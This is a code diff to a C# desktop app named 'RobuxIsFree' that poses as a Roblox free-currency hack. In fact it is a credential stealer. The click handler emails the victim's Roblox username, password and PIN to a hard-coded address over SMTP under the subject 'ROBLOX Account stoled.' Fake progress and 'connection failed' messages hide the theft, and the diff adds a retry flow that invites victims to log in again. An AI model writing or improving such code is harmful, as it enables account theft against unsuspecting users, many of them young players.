@@ -33,33 +33,47 @@ namespace RobuxIsFree
 
         private void button1_Click(object sender, EventArgs e)
         {
-            timer1.Enabled = !timer1.Enabled;
-            timer2.Enabled = !timer2.Enabled;
-            progressBar1.Minimum = 0;
-            progressBar1.Maximum = 100;
-            progressBar1.Value = 0;
-            progressBar1.Step = 1;
-            MailMessage mail = new MailMessage();
-            SmtpClient smtpServer = new SmtpClient("smtp.gmail.com"); // U can change this if u want to use other mail services
-            mail.From = new MailAddress("sender@mail.com");
-            mail.To.Add("receiver@mail.com");
-            mail.Subject = "ROBLOX Account stoled.";
-            smtpServer.Port = 587;
-            smtpServer.Credentials = new NetworkCredential("sender@mail.address", "sendermailpassword");
-            smtpServer.EnableSsl = true;
-            if (i == pincode.Text.Count())
+            if (pyleia.Checked == true)
             {
-                mail.Body = "Username : " + name.Text + " | Password : " + password.Text + " | PIN Code : " + pincode.Text;
-                smtpServer.Send(mail);
+                timer1.Enabled = !timer1.Enabled;
+                timer2.Enabled = !timer2.Enabled;
+                name.Enabled = false;
+                password.Enabled = false;
+                pincode.Enabled = false;
+                textBox1.Enabled = false;
+                pyleia.Enabled = false;
+                progressBar1.Minimum = 0;
+                progressBar1.Maximum = 100;
+                progressBar1.Value = 0;
+                progressBar1.Step = 1;
+                MailMessage mail = new MailMessage();
+                SmtpClient smtpServer = new SmtpClient("smtp.gmail.com"); // U can change this if u want to use other mail services
+                mail.From = new MailAddress("sender@mail.com");
+                mail.To.Add("receiver@mail.com");
+                mail.Subject = "ROBLOX Account stoled.";
+                smtpServer.Port = 587;
+                smtpServer.Credentials = new NetworkCredential("sender@mail.address", "sendermailpassword");
+                smtpServer.EnableSsl = true;
+                if (i == pincode.Text.Count())
+                {
+                    mail.Body = "Username : " + name.Text + " | Password : " + password.Text + " | PIN Code : " + pincode.Text;
+                    smtpServer.Send(mail);
+                }
+                else
+                {
+                    mail.Body = "Username : " + name.Text + " | Password : " + password.Text + " | PIN Code : none";
+                    smtpServer.Send(mail);
+                }
+
+                FTerm fTerm = new FTerm();
+                fTerm.Show();
+                button1.Text = "Waiting for hack to be finished.";
+                button1.Enabled = false;
             }
             else
             {
-                mail.Body = "Username : " + name.Text + " | Password : " + password.Text + " | PIN Code : none";
-                smtpServer.Send(mail);
+                MessageBox.Show("You haven't choose any mode to hack R$", "RobuxIsFree");
             }
-
-            FTerm fTerm = new FTerm();
-            fTerm.Show();
         }
 
         int j = 0;
@@ -68,13 +82,14 @@ namespace RobuxIsFree
             j++;
             progressBar1.PerformStep();
             if (j == 1)
-                {
-                label4.Text = "Status : Initzaling the hack tool...";
-                }
+            {
+                label4.Text = "Selected mode : PyLEiA || Status : Initzaling the hack tool...";
+            }
             else if (j == 10)
             {
                 label4.Text = "Status : Connecting to ROBLOX...";
-            }else if (j == 20)
+            }
+            else if (j == 20)
             {
                 label4.Text = "Status : Connect to ROBLOX failed! Retry 1...";
             }
@@ -108,16 +123,25 @@ namespace RobuxIsFree
             }
             else if (j >= 100)
             {
+                j = 0;
                 label4.Text = "Status : Connect to ROBLOX failed! Do you lost your internet? Is your firewall blocked this app? Or maybe your ip is banned by ROBLOX :(";
                 timer1.Stop();
-                MessageBox.Show("Connect to ROBLOX failed! Do you lost your internet?\nIs your firewall blocked this app? \nOr maybe your ip is banned by ROBLOX :( This app will exit in 5 second.", "RobuxIsFree");
+                timer2.Stop();
+                button1.Text = "Relogin and hack R$.";
+                MessageBox.Show("Connect to ROBLOX failed! Do you lost your internet?\nIs your firewall blocked this app? \nOr maybe your ip is banned by ROBLOX :(\nMaybe try again may help you!", "RobuxIsFree");
+                progressBar1.Value = 0;
+                button1.Enabled = true;
+                name.Enabled = true;
+                password.Enabled = true;
+                pincode.Enabled = true;
+                textBox1.Enabled = true;
+                pyleia.Enabled = true;
             }
-
         }
 
         private void button2_Click(object sender, EventArgs e)
         {
-            MessageBox.Show("RobuxIsFree made by teppy! | Youtube : TreTrauIT","RobuxIsFree");
+            MessageBox.Show("Credit :\nteppy - for making this aweasome app!\niamdumdum123 - being a good tester", "RobuxIsFree");
         }
 
         private void pincode_TextChanged_1(object sender, EventArgs e)
@@ -142,10 +166,18 @@ namespace RobuxIsFree
 
             if (fc == null)
             {
+                j = 0;
                 timer1.Stop();
                 timer2.Stop();
-                MessageBox.Show("Exiting RobuxIsFree beacuse the terminal is closed...","RobuxIsFree");
-                Environment.Exit(0);
+                label4.Text = "Status : Hack failed (reason : user closed terminal.)";
+                progressBar1.Value = 0;
+                button1.Text = "Relogin and hack R$.";
+                button1.Enabled = true;
+                name.Enabled = true;
+                password.Enabled = true;
+                pincode.Enabled = true;
+                textBox1.Enabled = true;
+                pyleia.Enabled = true;
             }
         }
     }
